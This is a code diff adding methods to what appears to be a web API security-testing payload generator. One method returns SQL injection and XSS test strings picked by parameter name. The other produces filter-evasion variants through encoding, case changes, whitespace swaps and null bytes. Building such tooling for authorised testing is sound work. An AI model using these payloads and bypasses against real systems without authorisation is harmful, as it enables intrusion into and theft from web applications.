@@ -407,6 +407,73 @@ class APIPayloadGenerator:
         
         return stats
 
+    def generate_context_aware_payloads(self, request_context, vulnerability_type):
+        """Generate context-aware payloads based on request analysis"""
+        context_payloads = []
+        
+        if vulnerability_type == 'sql_injection':
+            # Check for numeric parameters
+            if 'id' in request_context.get('params', {}):
+                context_payloads.extend([
+                    "1 OR 1=1",
+                    "1' OR '1'='1",
+                    "1 UNION SELECT NULL--",
+                    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+                ])
+            
+            # Check for string parameters
+            if 'search' in request_context.get('params', {}):
+                context_payloads.extend([
+                    "' OR '1'='1",
+                    "' UNION SELECT NULL--",
+                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+                ])
+        
+        elif vulnerability_type == 'xss':
+            # Check for HTML content parameters
+            if 'content' in request_context.get('params', {}) or 'message' in request_context.get('params', {}):
+                context_payloads.extend([
+                    "<script>alert('XSS')</script>",
+                    "<img src=x onerror=alert('XSS')>",
+                    "javascript:alert('XSS')"
+                ])
+        
+        return context_payloads
+    
+    def generate_advanced_bypass_payloads(self, base_payload, bypass_techniques=None):
+        """Generate advanced bypass payloads using various techniques"""
+        if bypass_techniques is None:
+            bypass_techniques = ['encoding', 'case_variation', 'whitespace', 'null_byte']
+        
+        bypass_payloads = [base_payload]
+        
+        for technique in bypass_techniques:
+            if technique == 'encoding':
+                bypass_payloads.extend([
+                    quote(base_payload),  # URL encoding
+                    quote(quote(base_payload)),  # Double encoding
+                    base64.b64encode(base_payload.encode()).decode()  # Base64 encoding
+                ])
+            elif technique == 'case_variation':
+                bypass_payloads.extend([
+                    base_payload.upper(),
+                    base_payload.lower(),
+                    ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(base_payload))
+                ])
+            elif technique == 'whitespace':
+                bypass_payloads.extend([
+                    base_payload.replace('=', ' = '),
+                    base_payload.replace(' ', '\t'),
+                    base_payload.replace(' ', '\n')
+                ])
+            elif technique == 'null_byte':
+                bypass_payloads.extend([
+                    base_payload + '\x00',
+                    base_payload + '%00'
+                ])
+        
+        return bypass_payloads
+
 # Example usage
 if __name__ == "__main__":
     generator = APIPayloadGenerator()
